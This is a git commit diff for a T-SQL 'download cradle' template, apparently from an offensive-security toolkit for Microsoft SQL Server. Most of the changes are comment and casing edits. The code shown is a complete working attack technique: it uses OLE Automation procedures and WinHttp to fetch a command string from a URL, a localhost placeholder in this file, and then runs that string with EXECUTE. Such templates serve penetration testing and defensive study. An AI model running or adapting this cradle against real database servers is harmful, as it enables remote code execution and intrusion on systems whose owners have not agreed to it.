b86f2b1032336173e18f8078bf1d56e0d36dbfc0
Scott Sutherland <nullbind@users.noreply.github.com>
2017-09-06 08:15:02 -0500

    Update download_cradle_tsql_oap2.sql

--- Stable-ish/MSSQL/templates-tsql/download_cradle_tsql_oap2.sql
+++ Stable-ish/MSSQL/templates-tsql/download_cradle_tsql_oap2.sql
@@ -11,30 +11,30 @@ DECLARE @Command varchar(8000)
 SET @url = 'http://127.0.0.1/mycmd.txt'
 
 -- Create temp table to store downloaded string
-CREATE TABLE #text(html text NULL) /* comment out to use @Command variable for small data */
+CREATE TABLE #text(html text NULL) 
 
 -- Setup namespace
 EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT  
 
--- Setup method
+-- Call open method to configure HTTP request
 EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'
 
--- Send http GET request
+-- Call Send method to send the HTTP request
 EXEC @Handle=sp_OAMethod @WinHTTP,'Send'
 
--- Grab response and throw it in the temp table 
+-- Capture the HTTP response content 
 INSERT #text(html) 
 EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'
 
 -- Destroy the object
 EXEC @Handle=sp_OADestroy @WinHTTP  
 
--- SELECT commad
+-- Display the commad
 SELECT @Command = html from #text
 SELECT @Command
 
--- Run command
-execute(@Command)
+-- Run the command
+EXECUTE (@Command)
 
 -- Remove temp table
-drop table #text
+DROP TABLE #text
